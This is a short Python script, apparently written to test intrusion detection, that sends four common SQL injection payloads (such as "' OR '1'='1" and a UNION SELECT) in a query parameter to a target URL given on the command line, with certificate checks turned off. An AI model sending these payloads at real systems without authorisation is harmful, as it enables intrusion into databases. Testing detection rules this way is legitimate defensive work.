import requests
import argparse
import time


def run_attack(target):
    print(f"[*] Starting SQL Injection Simulation against {target}...")

    # Common SQLi patterns that usually trigger IDS rules
    payloads = [
        "' OR '1'='1",
        "UNION SELECT NULL, NULL--",
        "admin' --",
        "' OR 1=1 --"
    ]

    for i, payload in enumerate(payloads):
        try:
            # Send payload in a query parameter
            url = f"{target}/?q={payload}"
            print(f"[{i + 1}/{len(payloads)}] Sending GET: {payload}")
            response = requests.get(url, timeout=2, verify=False)
            print(f"    -> Status Code: {response.status_code}")
        except Exception as e:
            print(f"    -> Error: {e}")

        time.sleep(0.5)  # Brief pause to not overwhelm

    print("[*] Simulation Complete.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', required=True, help="Target URL (e.g., http://localhost)")
    args = parser.parse_args()

    run_attack(args.target)